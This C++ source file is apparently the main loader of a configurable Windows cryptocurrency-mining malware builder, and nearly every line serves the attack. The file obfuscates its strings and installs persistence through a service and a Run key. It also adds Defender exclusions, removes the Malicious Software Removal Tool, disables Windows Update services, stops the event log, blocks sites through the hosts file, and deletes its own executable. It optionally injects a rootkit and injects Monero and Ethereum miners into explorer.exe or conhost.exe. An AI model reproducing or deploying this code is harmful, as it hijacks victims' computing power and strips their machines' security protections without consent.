#include "Includes/ntddk.h"

#include "Includes/common.h"
#include "Includes/obfuscateu.h"
#include "Includes/inject.h"
#include "Includes/watchdog.h"
#include "peconv/buffer_util.h"
#include "Includes/peloader.h"
#include "peconv/pe_loader.h"
#include "peconv/peb_lookup.h"
#include "peconv/delayed_imports_loader.h"
#include "peconv/tls_parser.h"
#include <windows.h>
#include <cstdio>
#include <ctime>
#include <sstream>
#include <intrin.h>
#include <iostream>


#ifndef STARTDELAY
#define STARTDELAY 15000
#endif

#ifndef CONHOSTPATH
#define CONHOSTPATH "\\conhost.exe"
#define LCONHOSTPATH L"\\conhost.exe"
#endif


#ifndef INJECT_TARGET
#define INJECT_TARGET "explorer.exe"
#endif


#ifndef LWINRINGNAME
#define LWINRINGNAME L"\\qbafufdsigxp.sys"
#endif


#if DefBlockWebsites
void add_to_hosts(char* hostsData, ULONG* hostsSize, char* domain, ULONG domainSize) {
    if (strstr(hostsData, domain) == NULL) {
        strcat(hostsData, AYU_OBFA("\r\n0.0.0.0      "));
        strcat(hostsData, domain);
        *hostsSize += domainSize;
    }
}
#endif
#if DefResources
$RESOURCES
#else
BYTE resWatchdog[] = {0};
size_t resWatchdogSize = 0;
BYTE resWR64[] = {0};
size_t resWR64Size = 0;
BYTE resXMR[] = {0};
size_t resXMRSize = 0;
BYTE resETH[] = {0};
size_t resETHSize = 0;

#endif

#ifndef BUILT_UNIX_TIMESTAMP
#define BUILT_UNIX_TIMESTAMP 1740100996
#endif

void install_executable(wchar_t *exePath, wchar_t *startupPath) {
    ULONG fileSize;
    PVOID exeFile = read_file(exePath, &fileSize);
    write_file(startupPath, exeFile, fileSize);
    auto exeDir = GetFileDirectory(exePath);
    auto startupDir = GetFileDirectory(startupPath);
#if DefDllMode
#ifndef MyDllName
#define MyDllName L""
#endif
    wchar_t dllPath[MAX_PATH] = {0};
    ULONG dllFileSize;
    wcscpy(dllPath, exeDir.c_str());
    wcscat(dllPath, MyDllName);
    PVOID dllData = read_file(dllPath, &dllFileSize);
    wcscpy(dllPath, startupDir.c_str());
    wcscat(dllPath, MyDllName);
    write_file(dllPath, dllData, dllFileSize);
#endif
    SIZE_T memorySize = 0;
    UtFreeVirtualMemory(UtCurrentProcess(), &exeFile, &memorySize, AYU_OBFC(MEM_RELEASE));
}

int main(int argc, char *argv[]) {
    PUT_PEB_EXT peb = (PUT_PEB_EXT) SWU_GetPEB();
    wchar_t *pebenv = (wchar_t *) peb->ProcessParameters->Environment;
#ifdef DISABLE_INJECT_PROCESS
// TODO Not work right now.
//    if (wcsstr(peb->ProcessParameters->CommandLine.Buffer, AYU_OBFW(LMinerXMRID)) != NULL) {
//        size_t payloadImageSize = 0;
//        BYTE *loaded_pe = peconv::load_pe_module(resXMR, resXMRSize, payloadImageSize, true, false);
//        std::cout << pe2shc_entry(loaded_pe, tls_callbacks) << std::endl;
//        return 0;
//    }
//    if (wcsstr(peb->ProcessParameters->CommandLine.Buffer, AYU_OBFW(LMinerETHID)) != NULL) {
//        size_t payloadImageSize = 0;
//        BYTE *loaded_pe = peconv::load_pe_module(resETH, resETHSize, payloadImageSize, true, false);
//        std::cout << pe2shc_entry(loaded_pe, tls_callbacks) << std::endl;
//        return 0;
//    }
//    if (wcsstr(peb->ProcessParameters->CommandLine.Buffer, AYU_OBFW(LWATCHDOGID)) != NULL) {
//
//        watchdog();
//        return 0;
//    }
#endif

    wchar_t exePath[MAX_PATH] = {0};
    wcscat(exePath, ((PRTL_USER_PROCESS_PARAMETERS) peb->ProcessParameters)->ImagePathName.Buffer);
#if DefStartup
    wchar_t startupPath[MAX_PATH] = {0};
    combine_path(startupPath, get_env(pebenv, AYU_OBFW(L"PROGRAMDATA=")),
                 AYU_OBFW(LSTARTUPFILE));
    wchar_t backupPath[MAX_PATH] = {0};
    combine_path(backupPath, get_env(pebenv, AYU_OBFW(L"APPDATA=")),
                 AYU_OBFW(L"\\RANDOM\\random.exe"));
#endif
    bool isAdmin = check_administrator();
    UNICODE_STRING umutex = init_unicode_string(AYU_OBFW(LMUTEXMINER));
    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);


    wchar_t sysdir[MAX_PATH] = {0};
    combine_path(sysdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")), AYU_OBFW(L"\\system32"));

    wchar_t powershellPath[MAX_PATH] = {0};
    combine_path(powershellPath, sysdir, AYU_OBFW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

#if DefRunAsAdministrator
    if (!isAdmin) {
        if (wcsicmp(exePath, backupPath) != 0 && !install_check(startupPath)) {
            run_program(false, sysdir, powershellPath, AYU_OBFW(L"%S Start-Process '\"%S\"' -Verb runAs"),
                        powershellPath,
                        exePath);
            install_executable(exePath, backupPath);
            wchar_t backupDir[MAX_PATH] = {0};
            wcscpy(backupDir, GetFileDirectory(backupPath).c_str());
            run_program(false, backupDir, backupPath, backupPath);
            return 0;
        }
        wchar_t regPath[MAX_PATH] = {0};
        combine_path(regPath, sysdir, AYU_OBFW(L"\\reg.exe"));
        run_program(true, sysdir, regPath, AYU_OBFW(
                L"%S add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" LSTARTUPENTRYNAME L"\" /t REG_SZ /f /d \"%S\""),
                    regPath, backupPath);
        LARGE_INTEGER s;
        s.QuadPart = -(AYU_OBFC(3 * 60 * 1000 * 10000));
        UtDelayExecution(FALSE, &s);

        while (!install_check(startupPath)) {
            run_program(false, sysdir, powershellPath, AYU_OBFW(L"%S Start-Process '\"%S\"' -Verb runAs"),
                        powershellPath,
                        exePath);
            LARGE_INTEGER _s;
            _s.QuadPart = -(AYU_OBFC(3 * 60 * 1000 * 10000));
            UtDelayExecution(FALSE, &_s);
        }
        return 0;
    }
#endif
    HANDLE hMutex;
    if (!NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, TRUE))) {
        return 0;
    }

#if DefStartDelay
#if DefStartup
    if (wcsicmp(exePath, startupPath) != 0) {
#endif
        LARGE_INTEGER sleeptime;
        sleeptime.QuadPart = -(AYU_OBFC(STARTDELAY * 10000));
        UtDelayExecution(FALSE, &sleeptime);
#if DefStartup
    }
#endif
#endif
    wchar_t cmdPath[MAX_PATH] = {0};
    combine_path(cmdPath, sysdir, AYU_OBFW(L"\\cmd.exe"));

    wchar_t conhostPath[MAX_PATH] = {0};
    combine_path(conhostPath, sysdir, AYU_OBFW(LCONHOSTPATH));

    wchar_t scPath[MAX_PATH] = {0};
    combine_path(scPath, sysdir, AYU_OBFW(L"\\sc.exe"));

#if DefWDExclusions
    run_program(true, sysdir, powershellPath, AYU_OBFW(
            L"%S Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramData,$env:windir) -ExclusionExtension @('.exe','.dll') -Force"),
                powershellPath);
    run_program(false, sysdir, cmdPath, AYU_OBFW(L"%S /c wusa /uninstall /kb:890830 /quiet /norestart"), cmdPath);
    wchar_t msrtPath[MAX_PATH] = {0};
    combine_path(msrtPath, sysdir, AYU_OBFW(L"\\MRT.exe"));
    delete_file(msrtPath);

    HANDLE hMSRTKey = NULL;
    UNICODE_STRING regKey = init_unicode_string(AYU_OBFW(L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\MRT"));
    InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);

    if (!NT_SUCCESS(UtOpenKey(&hMSRTKey, AYU_OBFC(KEY_QUERY_VALUE | KEY_SET_VALUE), &attr))) {
        UtCreateKey(&hMSRTKey, AYU_OBFC(KEY_QUERY_VALUE | KEY_SET_VALUE), &attr, 0, NULL,
                    AYU_OBFC(REG_OPTION_NON_VOLATILE), NULL);
    }

    if (hMSRTKey) {
        DWORD disableMSRT = 1;
        UNICODE_STRING uvalue = init_unicode_string(AYU_OBFW(L"DontOfferThroughWUAU"));
        UtSetValueKey(hMSRTKey, &uvalue, 0, AYU_OBFC(REG_DWORD), &disableMSRT, AYU_OBFC(sizeof(DWORD)));
        UtClose(hMSRTKey);
    }
#endif

#if DefDisableWindowsUpdate
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop UsoSvc"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop WaaSMedicSvc"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop wuauserv"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop bits"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop dosvc"), scPath);
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc"),
                        AYU_OBFW(L"UsoSvc_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"),
                        AYU_OBFW(L"WaaSMedicSvc_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\wuauserv"),
                        AYU_OBFW(L"wuauserv_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\BITS"),
                        AYU_OBFW(L"BITS_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\dosvc"),
                        AYU_OBFW(L"dosvc_bkp"));
#endif

#if DefDisableSleep
    wchar_t powercfgPath[MAX_PATH] = {0};
    combine_path(powercfgPath, sysdir, AYU_OBFW(L"\\powercfg.exe"));
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -hibernate-timeout-ac 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -hibernate-timeout-dc 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -standby-timeout-ac 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -standby-timeout-dc 0"), powercfgPath);
#endif

#if DefBlockWebsites
    wchar_t hostsPath[MAX_PATH] = { 0 };
    combine_path(hostsPath, sysdir, AYU_OBFW(L"\\drivers\\etc\\hosts"));
    ULONG hostsFileSize = 0;
    PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
    SIZE_T allocatedSize = hostsFileSize + AYU_OBFC($DOMAINSIZE);
    PVOID hostsData = NULL;
    if (NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE)))) {
        if(hostsFile != NULL){
            strcpy((char*)hostsData, (char*)hostsFile);
            UtFreeVirtualMemory(UtCurrentProcess(), &hostsFile, &allocatedSize, AYU_OBFC(MEM_RELEASE));
        }
        $CPPDOMAINSET
        write_file(hostsPath, hostsData, strlen((char*)hostsData));
        UtFreeVirtualMemory(UtCurrentProcess(), &hostsData, &allocatedSize, AYU_OBFC(MEM_RELEASE));
    }
#endif

#if DefRootkit
    inject_process(NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, nullptr, false);
#endif

#if DefProcessProtect
    TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };

    HANDLE hToken = NULL;
    if (NT_SUCCESS(UtOpenProcessToken(UtCurrentProcess(), AYU_OBFC(TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))) {
        debugPriv = NT_SUCCESS(UtAdjustPrivilegesToken(hToken, 0, &privilege, AYU_OBFC(sizeof(privilege)), NULL, NULL));
        UtClose(hToken);
    }
#endif

#if DefStartup
    if (!install_check(startupPath)) {
        run_program(true, sysdir, scPath, AYU_OBFW(L"%S delete \"%S\""), scPath, LSTARTUPENTRYNAME);
        run_program(true, sysdir, scPath,
                    AYU_OBFW(L"%S create \"%S\" binpath= \"%S\" start= \"auto\""), scPath, LSTARTUPENTRYNAME,
                    startupPath);
    }


    if (wcsicmp(exePath, startupPath) != 0) {
        install_executable(exePath, startupPath);

#if DefRunInstall
        run_program(false, sysdir, scPath, AYU_OBFW(L"%S stop eventlog"), scPath);
        run_program(false, sysdir, scPath, AYU_OBFW(L"%S start \"%S\""), scPath, LSTARTUPENTRYNAME);

#endif
#if DefAutoDelete
        run_program(false, sysdir, cmdPath, AYU_OBFW(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
#endif
        return 0;
    }
    wchar_t tempPath[MAX_PATH] = {0};
    combine_path(tempPath, get_env(pebenv, AYU_OBFW(L"TEMP=")), AYU_OBFW(L"\\RANDOM\\random.exe"));
#if DefWatchdog

#ifdef DISABLE_INJECT_PROCESS
    if (!check_mutex(AYU_OBFW(L"\\BaseNamedObjects\\" LWATCHDOGID))) {
        install_executable(exePath, tempPath);
        run_program(false, sysdir, tempPath, AYU_OBFW(L"watchdog.exe " LWATCHDOGID));
    }
#else
    inject_process(AYU_OBFW(L"\\BaseNamedObjects\\" LWATCHDOGID), (BYTE *) resWatchdog, resWatchdogSize,
                   conhostPath,
                   nullptr, sysdir);
#endif
#endif
#endif
#if DefMineXMR
    write_resource(resWR64, resWR64Size, get_env(pebenv, AYU_OBFW(L"TEMP=")), AYU_OBFW(LWINRINGNAME));
#endif
#if DefMineETH
    bool hasGPU = has_gpu();
#endif

    std::string rootDirStr = getEnvironmentVariable("SYSTEMROOT");
    wchar_t rootdir[MAX_PATH] = {0};
    wcscat(rootdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")));
    wchar_t injectPath[MAX_PATH] = {0};
    combine_path(injectPath, rootdir, AYU_OBFW(L"\\explorer.exe"));
#if DefMineETH

#ifndef MinerETHArgs
#define MinerETHArgs L""
#endif
    if (hasGPU) {
#ifdef DISABLE_INJECT_PROCESS

        if (!check_mutex(AYU_OBFW(L"\\BaseNamedObjects\\" LMinerETHID))) {
            install_executable(exePath, tempPath);
            run_program(false, sysdir, tempPath, AYU_OBFW(MinerETHArgs));
        }
#else
        inject_process(AYU_OBFW(L"\\BaseNamedObjects\\" LMinerETHID), resETH, resETHSize, injectPath,
                       AYU_OBFW(MinerETHArgs), sysdir);
#endif
    }
#endif
#if DefMineXMR
#ifndef MinerXMRArgs
#define MinerXMRArgs L""
#endif
#ifdef DISABLE_INJECT_PROCESS

    if (!check_mutex(AYU_OBFW(L"\\BaseNamedObjects\\" LMinerXMRID))) {
        install_executable(exePath, tempPath);
        run_program(false, sysdir, tempPath, AYU_OBFW(MinerXMRArgs));
    }
#else
    inject_process(AYU_OBFW(L"\\BaseNamedObjects\\" LMinerXMRID), resXMR, resXMRSize, injectPath,
                   AYU_OBFW(MinerXMRArgs), sysdir);
#endif
#endif

    UtClose(hMutex);
    return 0;
}


